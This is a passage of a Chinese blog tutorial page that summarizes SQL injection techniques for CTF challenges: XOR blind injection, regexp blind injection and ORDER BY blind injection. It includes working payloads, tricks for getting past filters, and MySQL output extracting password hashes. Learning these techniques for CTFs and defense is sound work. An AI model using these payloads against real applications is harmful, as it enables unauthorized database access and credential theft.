@@ -1,0 +1,883 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="前言感觉现在的sql注入的题目实在是太多了，而且自己还不怎么会因此总结一波。 0x01 XOR注入因为这种方法利用了异或符号，所以给他取名为xor注入。1. 基本的注入payload123admin&amp;apos;^(ascii(mid((password)from(i)))&amp;gt;j)^&amp;apos;1&amp;apos;=&amp;apos;1&amp;apos;%23或者admin&amp;apos;^(ascii(mid((p">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql注入的知识总结">
+<meta property="og:url" content="http://yoursite.com/2019/11/06/sql注入的知识总结/index.html">
+<meta property="og:site_name" content="L&#39;s Blog">
+<meta property="og:description" content="前言感觉现在的sql注入的题目实在是太多了，而且自己还不怎么会因此总结一波。 0x01 XOR注入因为这种方法利用了异或符号，所以给他取名为xor注入。1. 基本的注入payload123admin&amp;apos;^(ascii(mid((password)from(i)))&amp;gt;j)^&amp;apos;1&amp;apos;=&amp;apos;1&amp;apos;%23或者admin&amp;apos;^(ascii(mid((p">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-11-06T11:51:49.328Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="sql注入的知识总结">
+<meta name="twitter:description" content="前言感觉现在的sql注入的题目实在是太多了，而且自己还不怎么会因此总结一波。 0x01 XOR注入因为这种方法利用了异或符号，所以给他取名为xor注入。1. 基本的注入payload123admin&amp;apos;^(ascii(mid((password)from(i)))&amp;gt;j)^&amp;apos;1&amp;apos;=&amp;apos;1&amp;apos;%23或者admin&amp;apos;^(ascii(mid((p">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/11/06/sql注入的知识总结/">
+
+
+
+
+
+  <title>sql注入的知识总结 | L's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">L's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">share with you</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/11/06/sql注入的知识总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ljdd520">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="L's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">sql注入的知识总结</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-11-06T19:50:59+08:00">
+                2019-11-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  4.1k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  19
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>感觉现在的sql注入的题目实在是太多了，而且自己还不怎么会因此总结一波。</p>
+<h4 id="0x01-XOR注入"><a href="#0x01-XOR注入" class="headerlink" title="0x01 XOR注入"></a>0x01 XOR注入</h4><h6 id="因为这种方法利用了异或符号，所以给他取名为xor注入。"><a href="#因为这种方法利用了异或符号，所以给他取名为xor注入。" class="headerlink" title="因为这种方法利用了异或符号，所以给他取名为xor注入。"></a>因为这种方法利用了异或符号，所以给他取名为xor注入。</h6><h6 id="1-基本的注入payload"><a href="#1-基本的注入payload" class="headerlink" title="1. 基本的注入payload"></a>1. 基本的注入payload</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin&apos;^(ascii(mid((password)from(i)))&gt;j)^&apos;1&apos;=&apos;1&apos;%23</span><br><span class="line">或者</span><br><span class="line">admin&apos;^(ascii(mid((password)from(i)for(1)))&gt;j)^&apos;1&apos;=&apos;1&apos;%23</span><br></pre></td></tr></table></figure>
+
+<h6 id="我们来分析一下这个语句的格式："><a href="#我们来分析一下这个语句的格式：" class="headerlink" title="我们来分析一下这个语句的格式："></a>我们来分析一下这个语句的格式：</h6><h6 id="首先我们先用-符号来分割开语句。"><a href="#首先我们先用-符号来分割开语句。" class="headerlink" title="首先我们先用^符号来分割开语句。"></a>首先我们先用^符号来分割开语句。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin&apos;</span><br><span class="line">ascii(mid((password)from(i)))&gt;j</span><br><span class="line">&apos;1&apos;=&apos;1&apos;%23</span><br></pre></td></tr></table></figure>
+
+<h6 id="最前面和最后面的语句都固定为真-逻辑结果都为一-，只有中间的语句不确定真假，那么整个payload的逻辑结果都由中间的语句决定，那么我们就可以用这个特性来判断盲注的结果了"><a href="#最前面和最后面的语句都固定为真-逻辑结果都为一-，只有中间的语句不确定真假，那么整个payload的逻辑结果都由中间的语句决定，那么我们就可以用这个特性来判断盲注的结果了" class="headerlink" title="最前面和最后面的语句都固定为真(逻辑结果都为一)，只有中间的语句不确定真假，那么整个payload的逻辑结果都由中间的语句决定，那么我们就可以用这个特性来判断盲注的结果了"></a>最前面和最后面的语句都固定为真(逻辑结果都为一)，只有中间的语句不确定真假，那么整个payload的逻辑结果都由中间的语句决定，那么我们就可以用这个特性来判断盲注的结果了</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0^1^0 --&gt; 1 语句返回为真</span><br><span class="line">0^0^0 --&gt; 0 语句返回为假</span><br></pre></td></tr></table></figure>
+
+<h6 id="这里的mid函数的使用方法："><a href="#这里的mid函数的使用方法：" class="headerlink" title="这里的mid函数的使用方法："></a>这里的mid函数的使用方法：</h6><h6 id="正常的用法如下，对于str字符串，从pos作为索引值位置开始，返回截取len长度的子字符串"><a href="#正常的用法如下，对于str字符串，从pos作为索引值位置开始，返回截取len长度的子字符串" class="headerlink" title="正常的用法如下，对于str字符串，从pos作为索引值位置开始，返回截取len长度的子字符串"></a>正常的用法如下，对于str字符串，从pos作为索引值位置开始，返回截取len长度的子字符串</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MID(str,pos,len)</span><br></pre></td></tr></table></figure>
+
+<h6 id="例如："><a href="#例如：" class="headerlink" title="例如："></a>例如：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select mid(&apos;ljdd520&apos;,1,1);</span><br><span class="line">+--------------------+</span><br><span class="line">| mid(&apos;ljdd520&apos;,1,1) |</span><br><span class="line">+--------------------+</span><br><span class="line">| l                  |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<h6 id="这里的用法是，from-1-表示从第一个位置开始截取剩下的字符串，for-1-表示从改位置起一次就截取一个字符"><a href="#这里的用法是，from-1-表示从第一个位置开始截取剩下的字符串，for-1-表示从改位置起一次就截取一个字符" class="headerlink" title="这里的用法是，from(1)表示从第一个位置开始截取剩下的字符串，for(1)表示从改位置起一次就截取一个字符"></a>这里的用法是，from(1)表示从第一个位置开始截取剩下的字符串，for(1)表示从改位置起一次就截取一个字符</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mid((str)from(i))</span><br><span class="line">mid((str)from(i)for(1))</span><br></pre></td></tr></table></figure>
+
+<h6 id="例如下面的方式："><a href="#例如下面的方式：" class="headerlink" title="例如下面的方式："></a>例如下面的方式：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select mid((&apos;ljdd520&apos;)from(2));</span><br><span class="line">+-------------------------+</span><br><span class="line">| mid((&apos;ljdd520&apos;)from(2)) |</span><br><span class="line">+-------------------------+</span><br><span class="line">| jdd520                  |</span><br><span class="line">+-------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select mid((&apos;ljdd520&apos;)from(2)for(1));</span><br><span class="line">+-------------------------------+</span><br><span class="line">| mid((&apos;ljdd520&apos;)from(2)for(1)) |</span><br><span class="line">+-------------------------------+</span><br><span class="line">| j                             |</span><br><span class="line">+-------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<h6 id="这里可能还有疑问：为什么这里不加for可以正常的运行呢？"><a href="#这里可能还有疑问：为什么这里不加for可以正常的运行呢？" class="headerlink" title="这里可能还有疑问：为什么这里不加for可以正常的运行呢？"></a>这里可能还有疑问：为什么这里不加for可以正常的运行呢？</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">因为这里的ascii函数是默认取字符串中第一个字符的ascii码做为输出</span><br></pre></td></tr></table></figure>
+
+<h6 id="例如：-1"><a href="#例如：-1" class="headerlink" title="例如："></a>例如：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select ascii(&apos;ljdd520&apos;);</span><br><span class="line">+------------------+</span><br><span class="line">| ascii(&apos;ljdd520&apos;) |</span><br><span class="line">+------------------+</span><br><span class="line">|              108 |</span><br><span class="line">+------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<h5 id="2-使用场景"><a href="#2-使用场景" class="headerlink" title="2. 使用场景"></a>2. 使用场景</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">过滤了关键字：and、or</span><br><span class="line">过滤了逗号，</span><br><span class="line">过滤了空格</span><br></pre></td></tr></table></figure>
+
+<h6 id="如果这里过滤了-号的话，还可以用-gt-或者-lt-代替-大小的比较"><a href="#如果这里过滤了-号的话，还可以用-gt-或者-lt-代替-大小的比较" class="headerlink" title="如果这里过滤了=号的话，还可以用&gt;或者&lt;代替(大小的比较)"></a>如果这里过滤了=号的话，还可以用&gt;或者&lt;代替(大小的比较)</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：admin&apos;^(ascii(mid((password)from(i)))&gt;j)^(&apos;2&apos;&gt;&apos;1&apos;)%23</span><br></pre></td></tr></table></figure>
+
+<h6 id="如果这里过滤了-号和注释符的话，那就把最后一个引号去掉就可以和后面的引号匹配了-‘1’-’1"><a href="#如果这里过滤了-号和注释符的话，那就把最后一个引号去掉就可以和后面的引号匹配了-‘1’-’1" class="headerlink" title="如果这里过滤了%号和注释符的话，那就把最后一个引号去掉就可以和后面的引号匹配了 ‘1’=’1"></a>如果这里过滤了%号和注释符的话，那就把最后一个引号去掉就可以和后面的引号匹配了 ‘1’=’1</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select password from users where id=&apos;1&apos;^(ascii(mid((password)from(1)for(1)))&lt;&gt;ascii(6))^&apos;1&apos;=&apos;1&apos;;</span><br><span class="line">+----------------------------------+</span><br><span class="line">| password                         |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| 5936ce302cf318b88161fccd1bd9690f |</span><br><span class="line">+----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<h5 id="0x02-regexp注入"><a href="#0x02-regexp注入" class="headerlink" title="0x02 regexp注入"></a>0x02 regexp注入</h5><h6 id="1-基本注入payload"><a href="#1-基本注入payload" class="headerlink" title="1. 基本注入payload"></a>1. 基本注入payload</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select (select语句) regexp &apos;正则&apos;</span><br></pre></td></tr></table></figure>
+
+<h6 id="下面举一个例子来说明一下用法："><a href="#下面举一个例子来说明一下用法：" class="headerlink" title="下面举一个例子来说明一下用法："></a>下面举一个例子来说明一下用法：</h6><h6 id="首先正常的查询语句是这样的："><a href="#首先正常的查询语句是这样的：" class="headerlink" title="首先正常的查询语句是这样的："></a>首先正常的查询语句是这样的：</h6><h6 id="select-password-from-users-where-id-1"><a href="#select-password-from-users-where-id-1" class="headerlink" title="select password from users where id=1"></a><code>select password from users where id=1</code></h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select password from users where id=1;</span><br><span class="line">+----------------------------------+</span><br><span class="line">| password                         |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| 5936ce302cf318b88161fccd1bd9690f |</span><br><span class="line">+----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<h6 id="接着进行正则表达式注入，若匹配则返回1，不匹配返回0。"><a href="#接着进行正则表达式注入，若匹配则返回1，不匹配返回0。" class="headerlink" title="接着进行正则表达式注入，若匹配则返回1，不匹配返回0。"></a>接着进行正则表达式注入，若匹配则返回1，不匹配返回0。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (select password from users where id=1) regexp &apos;^5&apos;;</span><br><span class="line">+-----------------------------------------------------+</span><br><span class="line">| (select password from users where id=1) regexp &apos;^5&apos; |</span><br><span class="line">+-----------------------------------------------------+</span><br><span class="line">|                                                   1 |</span><br><span class="line">+-----------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<h6 id="这里的-表示pattern的开头"><a href="#这里的-表示pattern的开头" class="headerlink" title="这里的^表示pattern的开头"></a>这里的^表示pattern的开头</h6><h6 id="接下来只要一步步的判断就可以了"><a href="#接下来只要一步步的判断就可以了" class="headerlink" title="接下来只要一步步的判断就可以了"></a>接下来只要一步步的判断就可以了</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (select password from users where id=1) regexp &apos;^59&apos;;</span><br><span class="line">+------------------------------------------------------+</span><br><span class="line">| (select password from users where id=1) regexp &apos;^59&apos; |</span><br><span class="line">+------------------------------------------------------+</span><br><span class="line">|                                                    1 |</span><br><span class="line">+------------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<h6 id="或者regex这个关键字还可以代替where条件里的-号"><a href="#或者regex这个关键字还可以代替where条件里的-号" class="headerlink" title="或者regex这个关键字还可以代替where条件里的=号"></a>或者regex这个关键字还可以代替where条件里的=号</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select password from users where password regexp &apos;^59&apos;;</span><br><span class="line">+----------------------------------+</span><br><span class="line">| password                         |</span><br><span class="line">+----------------------------------+</span><br><span class="line">| 5936ce302cf318b88161fccd1bd9690f |</span><br><span class="line">+----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<h5 id="2-使用场景-1"><a href="#2-使用场景-1" class="headerlink" title="2. 使用场景"></a>2. 使用场景</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">过滤了=、in、like</span><br></pre></td></tr></table></figure>
+
+<h6 id="这里的-如果也被过滤了的话，可以使用-来从从后面进行匹配。"><a href="#这里的-如果也被过滤了的话，可以使用-来从从后面进行匹配。" class="headerlink" title="这里的^如果也被过滤了的话，可以使用$来从从后面进行匹配。"></a>这里的^如果也被过滤了的话，可以使用$来从从后面进行匹配。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select (select password from users where id=1) regexp &apos;0f$&apos;;</span><br><span class="line">+------------------------------------------------------+</span><br><span class="line">| (select password from users where id=1) regexp &apos;0f$&apos; |</span><br><span class="line">+------------------------------------------------------+</span><br><span class="line">|                                                    1 |</span><br><span class="line">+------------------------------------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure>
+
+<h6 id="详细的正则注入教程可以看这里"><a href="#详细的正则注入教程可以看这里" class="headerlink" title="详细的正则注入教程可以看这里"></a><a href="http://www.cnblogs.com/lcamry/articles/5717442.html" target="_blank" rel="noopener">详细的正则注入教程可以看这里</a></h6><h5 id="0x03-order-by盲注"><a href="#0x03-order-by盲注" class="headerlink" title="0x03 order by盲注"></a>0x03 order by盲注</h5><h5 id="1-基本注入payload-1"><a href="#1-基本注入payload-1" class="headerlink" title="1. 基本注入payload"></a>1. 基本注入payload</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where user_id = &apos;1&apos; union select 1,2,&apos;a&apos;,4,5,6,7 order by 3</span><br></pre></td></tr></table></figure>
+
+<h6 id="这里是order-by的用法："><a href="#这里是order-by的用法：" class="headerlink" title="这里是order by的用法："></a>这里是order by的用法：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by &apos;number&apos; (asc/desc)</span><br></pre></td></tr></table></figure>
+
+<h6 id="即对某一列进行排序，默认是升序排列，即后面默认跟上asc，那么上面一句就相当于："><a href="#即对某一列进行排序，默认是升序排列，即后面默认跟上asc，那么上面一句就相当于：" class="headerlink" title="即对某一列进行排序，默认是升序排列，即后面默认跟上asc，那么上面一句就相当于："></a>即对某一列进行排序，默认是升序排列，即后面默认跟上asc，那么上面一句就相当于：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users order by 3 asc</span><br></pre></td></tr></table></figure>
+
+<h6 id="我们在注入时经常会使用order-by来判断数据库的列数，那我们这里使用他配合union-select来进行注入。"><a href="#我们在注入时经常会使用order-by来判断数据库的列数，那我们这里使用他配合union-select来进行注入。" class="headerlink" title="我们在注入时经常会使用order by来判断数据库的列数，那我们这里使用他配合union select来进行注入。"></a>我们在注入时经常会使用order by来判断数据库的列数，那我们这里使用他配合union select来进行注入。</h6><h5 id="2-原理分析"><a href="#2-原理分析" class="headerlink" title="2. 原理分析"></a>2. 原理分析</h5><h6 id="我们现在的目的是要注出liyu用户的password值。"><a href="#我们现在的目的是要注出liyu用户的password值。" class="headerlink" title="我们现在的目的是要注出liyu用户的password值。"></a>我们现在的目的是要注出liyu用户的password值。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select *from users where id=&apos;2&apos; union select 1,2,3,4;</span><br><span class="line">+----+----------+------+----------------------------------+</span><br><span class="line">| id | username | age  | password                         |</span><br><span class="line">+----+----------+------+----------------------------------+</span><br><span class="line">|  2 | liyu     | 18   | 262728a22f16ad48aa602f831de92936 |</span><br><span class="line">|  1 | 2        | 3    | 4                                |</span><br><span class="line">+----+----------+------+----------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<h6 id="接着我们在语句后面加上order-by-4，即对第四列进行升序排序-按照ascii码表"><a href="#接着我们在语句后面加上order-by-4，即对第四列进行升序排序-按照ascii码表" class="headerlink" title="接着我们在语句后面加上order by 4，即对第四列进行升序排序(按照ascii码表)"></a>接着我们在语句后面加上order by 4，即对第四列进行升序排序(按照ascii码表)</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select *from users where id=&apos;2&apos; union select 1,2,3,4 order by 4 desc;</span><br><span class="line">+----+----------+------+----------------------------------+</span><br><span class="line">| id | username | age  | password                         |</span><br><span class="line">+----+----------+------+----------------------------------+</span><br><span class="line">|  1 | 2        | 3    | 4                                |</span><br><span class="line">|  2 | liyu     | 18   | 262728a22f16ad48aa602f831de92936 |</span><br><span class="line">+----+----------+------+----------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<h6 id="这里的password列中4是我们union-select里面的第四列，这里就把-39-4-39-替换为-39-1-39-。"><a href="#这里的password列中4是我们union-select里面的第四列，这里就把-39-4-39-替换为-39-1-39-。" class="headerlink" title="这里的password列中4是我们union select里面的第四列，这里就把&#39;4&#39;替换为&#39;1&#39;。"></a>这里的password列中4是我们union select里面的第四列，这里就把&#39;4&#39;替换为&#39;1&#39;。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select *from users where id=&apos;2&apos; union select 1,2,3,&apos;1&apos; order by 4 desc;</span><br><span class="line">+----+----------+------+----------------------------------+</span><br><span class="line">| id | username | age  | password                         |</span><br><span class="line">+----+----------+------+----------------------------------+</span><br><span class="line">|  2 | liyu     | 18   | 262728a22f16ad48aa602f831de92936 |</span><br><span class="line">|  1 | 2        | 3    | 1                                |</span><br><span class="line">+----+----------+------+----------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
+
+<h6 id="我们可以看到liyu用户跑到第一行来了，所以这里经常用来判断由返回差异的注入，且返回只有一列的输出，根据差异来判断我们的盲注值是否正确。"><a href="#我们可以看到liyu用户跑到第一行来了，所以这里经常用来判断由返回差异的注入，且返回只有一列的输出，根据差异来判断我们的盲注值是否正确。" class="headerlink" title="我们可以看到liyu用户跑到第一行来了，所以这里经常用来判断由返回差异的注入，且返回只有一列的输出，根据差异来判断我们的盲注值是否正确。"></a>我们可以看到liyu用户跑到第一行来了，所以这里经常用来判断由返回差异的注入，且返回只有一列的输出，根据差异来判断我们的盲注值是否正确。</h6><h5 id="3-使用场景"><a href="#3-使用场景" class="headerlink" title="3. 使用场景"></a>3. 使用场景</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">过滤了列名</span><br><span class="line">过滤了括号</span><br><span class="line">实用于已知该表的列名以及列名位置的注入</span><br></pre></td></tr></table></figure>
+
